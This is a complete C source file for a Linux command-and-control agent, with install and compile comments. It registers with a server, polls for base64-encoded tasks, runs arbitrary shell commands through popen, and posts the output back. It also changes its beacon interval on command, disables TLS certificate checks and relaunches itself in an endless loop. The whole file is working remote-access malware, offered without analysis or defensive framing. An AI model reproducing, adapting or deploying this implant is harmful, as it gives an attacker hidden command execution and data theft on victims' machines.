#include <stdio.h>
#include <curl/curl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <b64/cencode.h>
#include <b64/cdecode.h>

#define CURL_STATICLIB
#define MAX_OUTPUT_LENGTH 10000

#define B64_ENABLED 1

#define BASE_URL "https://localhost:5000"
#define REGISTER_URL BASE_URL "/register"
#define TASKS_URL BASE_URL "/tasks/%.*s"
#define RESULTS_URL BASE_URL "/results/%.*s"

#define DEBUG 0


// apt install libcurl4-openssl-dev libb64-dev
// gcc agent.c -o agent -lcurl -lb64


// encode decode functions from https://github.com/libb64/libb64/blob/master/examples/c-example1.c
char* encode(const char* input)
{
	/* set up a destination buffer large enough to hold the encoded data */
	char* output = (char*)malloc(MAX_OUTPUT_LENGTH);
	/* keep track of our encoded position */
	char* c = output;
	/* store the number of bytes encoded by a single call */
	int cnt = 0;
	/* we need an encoder state */
	base64_encodestate s;
	
	/*---------- START ENCODING ----------*/
	/* initialise the encoder state */
	base64_init_encodestate(&s);
	/* gather data from the input and send it to the output */
	cnt = base64_encode_block(input, strlen(input), c, &s);
	c += cnt;
	/* since we have encoded the entire input string, we know that 
	   there is no more input data; finalise the encoding */
	cnt = base64_encode_blockend(c, &s);
	c += cnt;
	/*---------- STOP ENCODING  ----------*/
	
	/* we want to print the encoded data, so null-terminate it: */
	*c = 0;
	
	return output;
}

char* decode(const char* input)
{
	/* set up a destination buffer large enough to hold the encoded data */
	char* output = (char*)malloc(MAX_OUTPUT_LENGTH);
	/* keep track of our decoded position */
	char* c = output;
	/* store the number of bytes decoded by a single call */
	int cnt = 0;
	/* we need a decoder state */
	base64_decodestate s;
	
	/*---------- START DECODING ----------*/
	/* initialise the decoder state */
	base64_init_decodestate(&s);
	/* decode the input data */
	cnt = base64_decode_block(input, strlen(input), c, &s);
	c += cnt;
	/* note: there is no base64_decode_blockend! */
	/*---------- STOP DECODING  ----------*/
	
	/* we want to print the decoded data, so null-terminate it: */
	*c = 0;
	
	return output;
}

struct string {
    char *ptr;
    size_t len;
};

void init_string(struct string *s) {
    s->len = 0;
    s->ptr = malloc(s->len+1);
    if (s->ptr == NULL) {
        fprintf(stderr, "malloc() failed\n");
        exit(-1);
    }
    s->ptr[0] = '\0';
}

size_t write_func(void *ptr, size_t size, size_t nmemb, struct string *s)
{
    size_t new_len = s->len + size*nmemb;
    s->ptr = realloc(s->ptr, new_len+1);
    if (s->ptr == NULL) {
        fprintf(stderr, "realloc() failed\n");
        exit(-1);
    }
    memcpy(s->ptr+s->len, ptr, size*nmemb);
    s->ptr[new_len] = '\0';
    s->len = new_len;

    return size*nmemb;
}

void split_string(char *str, char *firstToken, char *restOfTheString) {
    const char s[2] = " ";
    char *token;

    token = strtok(str, s);

    int flag = 0;

    while( token != NULL ) {
    if (flag == 0) {
        strcpy(firstToken, token); 
        flag = 1;
    } else {      
        strcat(restOfTheString, token);
        strcat(restOfTheString, " ");
    }

    token = strtok(NULL, s);
  }
}

void run_sys_command(char *command, char *output2)
{    
    char output[MAX_OUTPUT_LENGTH];    

    FILE *fp;
    fp = popen(command, "r");
    if (fp == NULL) {
        if(DEBUG)
            printf("Failed to run command\n");
        return;
    }

    while (fgets(output, MAX_OUTPUT_LENGTH, fp) != NULL) {
                
        strcat(output2, output);
        
    }    

    pclose(fp);    
}

int register_host(CURLcode res, CURL *curl, struct string *reg_str, int delay){
    
    if(DEBUG)
        printf("Registration...\n");
    
    // POST request to https://localhost/register
    //curl_easy_setopt(curl, CURLOPT_URL, "https://localhost:5000/register");
    curl_easy_setopt(curl, CURLOPT_URL, REGISTER_URL);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "type=linux");
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYSTATUS, 0);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
    // suppress printing
    //curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_func);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, reg_str);
    res = curl_easy_perform(curl);            

    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n",
            curl_easy_strerror(res));
        sleep(delay);
        return -1;
    }
    if(DEBUG)
        printf("this uuid: %s\n", reg_str->ptr);

    return 0;

}

int run(void) {

    CURL *curl;
    CURLcode res;
    char tasks_uuid[4096];
    char results_uuid[4096];
    char output2[MAX_OUTPUT_LENGTH];
    char result_cmd[MAX_OUTPUT_LENGTH];
    int delay = 10;
    int send_results = 0;


    curl = curl_easy_init();
    if (curl) {
        
        struct string reg_str;
        init_string(&reg_str);
        int reg_res = register_host(res, curl, &reg_str, delay);

        if(reg_res != 0){
            return reg_res;
        }
            

        while(1){            

            sleep(delay);

            // GET request to https://localhost/tasks/

            if(strlen(reg_str.ptr) == 0){                    
                // in case of a weird failure, we send a dummy uuid to trigger re-registration 
                
                //sprintf(tasks_uuid, "https://localhost:5000/tasks/%.*s", 4096, "dummyuuid");
                sprintf(tasks_uuid, TASKS_URL, 4096, "dummyuuid");
            }else{
                sprintf(tasks_uuid, TASKS_URL, 4096, reg_str.ptr);
                //sprintf(tasks_uuid, "https://localhost:5000/tasks/%.*s", 4096, reg_str.ptr);                    
            }
            
            if(DEBUG)
                printf("%s\n",tasks_uuid);
            struct string task_str;
            init_string(&task_str);

            curl_easy_setopt(curl, CURLOPT_URL, tasks_uuid);
            curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYSTATUS, 0);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
            // suppress printing
            //curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_func);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &task_str);
            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));
            }

            if(DEBUG)
                printf("task rcvd: %s\n",task_str.ptr);
            
            char c2_cmd[256] = "";
            char command[512] = "";

            if(B64_ENABLED){
                char* decoded;
                decoded = decode(task_str.ptr);
                split_string(decoded, c2_cmd, command);

                free(decoded);

            }
            else{

                split_string(task_str.ptr, c2_cmd, command);
                free(task_str.ptr);
            }
            
            if(DEBUG){
                printf("First token: %s\n", c2_cmd);
                printf("Rest of the tokens: %s\n", command);
                //printf("this command: %s\n", task_str.ptr);

            }            

            if(strcmp(c2_cmd,"c2-register") == 0) {
                if(DEBUG)
                    printf("c2-register\n");
                free(reg_str.ptr);
                init_string(&reg_str);
                register_host(res, curl, &reg_str, delay);

            }
            else if(strcmp(c2_cmd,"c2-quit") == 0) {
                if(DEBUG)
                    printf("c2-quit\n");
                exit(1);
            }
            else if(strcmp(c2_cmd,"c2-shell") == 0) {
                if(DEBUG)
                    printf("c2-shell\n");
                run_sys_command(command, output2);
                if(DEBUG)
                    printf("Output of the command:\n%s\n", output2);

            }
            else if(strcmp(c2_cmd,"c2-sleep") == 0) {
                if(DEBUG)
                    printf("c2-sleep\n");
                delay = atoi(command);                    
                if(DEBUG)
                    printf("c2-sleep delay is %d\n",delay);
                send_results = 1;

            }
            else {
                //printf("Unknown c2-command\n");
            }
            
            if(strlen(output2) != 0 || send_results == 1){
                if(DEBUG)
                    printf("Sending results...\n");

                if(send_results == 1){
                    send_results = 0;

                    if(B64_ENABLED){

                        char* encoded;                            
                        char int_str[50];

                        sprintf(int_str, "sleep changed to: %d", delay);
                        
                        encoded = encode(int_str);

                        sprintf(result_cmd, "result=%.*s", sizeof(char)*50, encoded);
                        free(encoded);

                    }
                    else{
                        sprintf(result_cmd, "result=%.*s %d", sizeof(char)*50, "sleep changed to:", delay);

                    }                        

                }
                else{

                    if(B64_ENABLED){
                        char* encoded;                            
                        
                        encoded = encode(output2);

                        sprintf(result_cmd, "result=%.*s", MAX_OUTPUT_LENGTH, encoded);

                        free(encoded);

                    }
                    else{
                        sprintf(result_cmd, "result=%.*s", MAX_OUTPUT_LENGTH, output2);

                    }
                        
                }
                if(DEBUG)
                    printf("results: %s\n",result_cmd);

                // POST request to https://localhost/results/
                    
                //sprintf(results_uuid, "https://localhost:5000/results/%.*s", 4096, reg_str.ptr);
                sprintf(results_uuid, RESULTS_URL, 4096, reg_str.ptr);
                
                curl_easy_setopt(curl, CURLOPT_URL, results_uuid);
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYSTATUS, 0);
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, result_cmd);
                res = curl_easy_perform(curl);
                if (res != CURLE_OK) {
                    fprintf(stderr, "curl_easy_perform() failed: %s\n",
                        curl_easy_strerror(res));
                }
            }

            memset(c2_cmd, 0, sizeof c2_cmd);
            memset(command, 0, sizeof command);
            memset(tasks_uuid, 0, sizeof tasks_uuid);
            memset(results_uuid, 0, sizeof results_uuid);
            memset(output2, 0, sizeof output2);
            memset(result_cmd, 0, sizeof result_cmd);

        }
        
        free(reg_str.ptr);
        
    }

    curl_easy_cleanup(curl);
    return 0;

}


int main(void){

    while(1){        
        run();
    }

}